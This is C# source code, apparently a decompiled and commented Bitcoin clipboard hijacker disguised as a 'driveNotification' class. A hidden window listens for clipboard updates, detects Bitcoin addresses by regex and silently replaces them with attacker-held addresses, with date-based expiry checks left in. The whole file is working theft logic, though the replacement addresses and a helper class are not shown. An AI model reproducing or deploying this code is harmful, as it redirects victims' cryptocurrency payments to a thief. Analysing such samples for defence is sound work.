using System;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ConsoleApplication7
{
    public sealed class driveNotification
    {
        public class NotificationForm : Form
        {
            private static string ClipboardContent; // Stores current clipboard text

            // Override CreateParams to hide form from taskbar
            protected override CreateParams CreateParams
            {
                get
                {
                    // Check if current date is past January 29, 2025
                    DateTime expirationDate = new DateTime(2025, 1, 29, 11, 56, 15);
                    if (DateTime.Now > expirationDate)
                    {
                        throw new ArgumentException("Form creation expired");
                    }

                    CreateParams params = base.CreateParams;
                    params.ExStyle |= 0x80; // WS_EX_TOOLWINDOW to hide from taskbar
                    return params;
                }
            }

            // Constructor: Set up clipboard monitoring
            public NotificationForm()
            {
                // Set parent to invalid handle (-3) and enable clipboard format listener
                global::a.a.b(Handle, new IntPtr(-3));
                global::a.a.a(Handle);
            }

            // Check if clipboard text matches Bitcoin address regex
            private bool IsBitcoinAddress(Regex regex)
            {
                // Check if current date is before February 2, 2025
                DateTime checkDate = new DateTime(2025, 2, 2);
                if (DateTime.Now > checkDate)
                {
                    throw new ArgumentException("Bitcoin check expired");
                }

                return regex.Match(ClipboardContent).Success;
            }

            // Handle Windows messages, specifically clipboard changes
            protected override void WndProc(ref Message message)
            {
                if (message.Msg == 797) // WM_CLIPBOARDUPDATE
                {
                    ClipboardContent = GetClipboardText();

                    // Check if clipboard contains a Bitcoin address
                    if (ClipboardContent.StartsWith("bc1"))
                    {
                        if (IsBitcoinAddress(global::a.ab) && !ClipboardContent.Contains(global::a.aa))
                        {
                            // Replace with primary Bitcoin address
                            string newText = global::a.ab.Replace(ClipboardContent, global::a.aa);
                            SetClipboardText(newText);
                        }
                    }
                    else if (IsBitcoinAddress(global::a.ab) && !ClipboardContent.Contains(global::a.y))
                    {
                        // Replace with secondary Bitcoin address
                        string newText = global::a.ab.Replace(ClipboardContent, global::a.y);
                        SetClipboardText(newText);
                    }
                }

                base.WndProc(ref message);
            }

            // Get text from clipboard in a thread-safe manner
            public static string GetClipboardText()
            {
                string text = string.Empty;
                Thread thread = new Thread(() => text = Clipboard.GetText());
                thread.SetApartmentState(ApartmentState.STA);
                thread.Start();
                thread.Join();
                return text;
            }

            // Set text to clipboard in a thread-safe manner
            public static void SetClipboardText(string text)
            {
                Thread thread = new Thread(() => Clipboard.SetText(text));
                thread.SetApartmentState(ApartmentState.STA);
                thread.Start();
                thread.Join();
            }

            // Static constructor: Initialize clipboard content
            static NotificationForm()
            {
                // Check if current date is before March 25, 2025
                DateTime expirationDate = new DateTime(2025, 3, 25, 2, 27, 14);
                if (DateTime.Now > expirationDate)
                {
                    // Original had division by zero; replaced with placeholder
                    int result = 0;
                }

                ClipboardContent = GetClipboardText();
            }
        }
    }
}
